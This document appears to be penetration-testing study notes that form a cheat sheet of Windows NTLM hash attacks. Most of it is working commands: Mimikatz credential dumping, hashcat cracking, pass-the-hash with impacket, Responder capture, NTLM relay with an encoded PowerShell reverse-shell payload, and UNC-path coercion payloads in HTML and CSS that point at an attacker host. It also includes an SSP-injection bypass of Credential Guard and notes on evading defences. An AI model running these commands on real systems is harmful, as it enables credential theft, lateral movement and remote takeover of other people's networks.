# Windows Hash Attacks

Techniques for extracting, cracking, relaying, and leveraging Windows NTLM and Net-NTLMv2 hashes for lateral movement and privilege escalation.

---

## NTLM Hash Extraction

### Mimikatz -- Local Hashes
```cmd
# Start Mimikatz as Administrator
.\mimikatz.exe

# Enable debug privilege
privilege::debug

# Elevate to SYSTEM
token::elevate

# Extract SAM hashes
lsadump::sam

# Extract cached credentials
sekurlsa::logonpasswords
```

### NTLM Hash Cracking
```bash
# Crack NTLM hash (mode 1000)
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

---

## Pass-the-Hash Attacks

### SMB Access
```bash
# smbclient with NTLM hash
smbclient \\\\<target_ip>\\<share> -U <username> --pw-nt-hash <ntlm_hash>

# Example
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

### Remote Code Execution
```bash
# PsExec with hash (SYSTEM shell)
impacket-psexec -hashes 00000000000000000000000000000000:<ntlm_hash> <username>@<target_ip>

# WMIExec with hash (user shell)
impacket-wmiexec -hashes 00000000000000000000000000000000:<ntlm_hash> <username>@<target_ip>
```

---

## Net-NTLMv2 Attacks

### Capture with Responder
```bash
# Start Responder
sudo responder -I <interface>

# Example
sudo responder -I tap0
```

### Force Authentication
```cmd
# From compromised Windows system
dir \\<attacker_ip>\test

# PowerShell
ls \\<attacker_ip>\share
```

### Crack Net-NTLMv2
```bash
# Save captured hash to file
cat > netntlmv2.hash << EOF
user::DOMAIN:challenge:response:response
EOF

# Crack with Hashcat (mode 5600)
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt --force
```

---

## NTLM Relay Attacks

### Setup Relay Attack
```bash
# ntlmrelayx with command execution
impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "<command>"

# Example with PowerShell reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc <base64_payload>"
```

### Trigger Relay
```cmd
# From compromised system
dir \\<attacker_ip>\test
```

---

## Authentication Coercion Vectors

### File Upload Attacks
```bash
# UNC path in file upload
\\<attacker_ip>\share\nonexistent.txt
```

### Web Application Attacks
```html
<!-- HTML img tag -->
<img src="\\<attacker_ip>\share\image.jpg">

<!-- CSS background -->
background: url('\\<attacker_ip>\share\image.jpg');
```

---

## Credential Guard Bypass

### Check Credential Guard Status
```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
```

### SSP Injection Bypass
```cmd
# In Mimikatz
privilege::debug
misc::memssp

# Check captured credentials
type C:\Windows\System32\mimilsa.log
```

---

## Hash Format Reference

### NTLM Hash
```
Format: 32 hex characters
Example: 8846f7eaee8fb117ad06bdd830b7586c
```

### Net-NTLMv2 Hash
```
Format: username::domain:challenge:response:response
Example: paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000...
```

---

## Local Enumeration

### PowerShell User Enumeration
```powershell
# List local users
Get-LocalUser

# Check user details
net user <username>

# Check group membership
net localgroup administrators
```

---

## Impacket Tools Reference

```bash
impacket-psexec      # Remote command execution (SYSTEM shell)
impacket-wmiexec     # WMI command execution (user shell)
impacket-smbexec     # SMB command execution
impacket-ntlmrelayx  # NTLM relay attacks
impacket-secretsdump # Extract secrets from remote systems
```

### Mimikatz Modules
```cmd
privilege::     # Privilege operations
token::         # Token manipulation
sekurlsa::      # Security packages (logonpasswords)
lsadump::       # LSA dump operations (sam)
misc::          # Miscellaneous operations (memssp)
```

---

## Common Attack Scenarios

### Scenario 1: Local Admin Access
1. Extract NTLM hashes with Mimikatz
2. Crack hashes or use pass-the-hash
3. Access other systems with same credentials

### Scenario 2: Unprivileged Access
1. Force authentication to Responder
2. Capture Net-NTLMv2 hash
3. Crack hash or relay to another system

### Scenario 3: Credential Guard Enabled
1. Inject malicious SSP with Mimikatz
2. Wait for user authentication
3. Capture plaintext credentials from log file

---

## Defense Evasion Notes
- Local Administrator account bypasses UAC remote restrictions
- Other local admin users are affected by UAC remote restrictions
- Domain accounts may have different restriction levels
